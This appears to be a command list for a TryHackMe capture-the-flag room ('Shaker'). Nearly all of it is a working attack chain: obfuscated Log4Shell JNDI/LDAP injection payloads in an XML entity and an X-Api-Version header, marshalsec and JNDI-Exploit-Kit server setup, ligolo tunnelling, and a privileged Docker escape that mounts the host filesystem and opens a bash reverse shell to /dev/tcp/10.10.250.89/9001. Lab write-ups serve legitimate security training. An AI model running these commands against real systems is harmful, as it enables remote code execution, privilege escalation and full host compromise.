Below commands used to solve TryHackMe room Shaker https://tryhackme.com/room/shaker
Full video walk through: https://youtu.be/D93kehXyV2Q

Install ing marshalsec

java -version
sudo apt install openjdk-8-jdk
sudo update-alternatives --config java
sudo apt install maven

python3.9 -m http.server

git clone https://github.com/mbechler/marshalsec.git

cd marshalsec/
mvn clean package -DskipTests

java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.10.250.89:8000/#Exploit" 1389

xml file used:

<?xml version="1.0"?>
<thm>${${::-j}ndi:ldap://10.10.250.89:1389/Exploit}</thm>

Compile your exploit:

javac -source 1.8 -target 1.8 -bootclasspath /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar Exploit.java

Installing ligolo

sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up

./proxy -selfcert -laddr 0.0.0.0:12346

sudo ip addr add 172.18.0.2/16 dev ligolo
sudo ip route add 172.18.0.0/16 dev ligolo


curl http://172.18.0.1:8888/ -H 'X-Api-Version: ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://10.10.250.89:1389/Exploit}'

JNDI-Exploit-Kit

java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar   -R 10.10.250.89:1099 -J 10.10.250.89:8180 -S 10.10.250.89:5555

Root Access:

docker pull alpine
docker save alpine > alpine.tar

stabilize your shell:
script /dev/null -c bash

curl -o /tmp/alpine.tar http://10.10.134.12:8000/alpine.tar

docker load < /tmp/alpine.tar

docker run --privileged -v /:/mnt alpine cat /mnt/root/root.txt

docker run --privileged -v /:/mnt alpine /bin/sh -c "chroot /mnt bash -c 'bash -i >& /dev/tcp/10.10.250.89/9001 0>&1'"
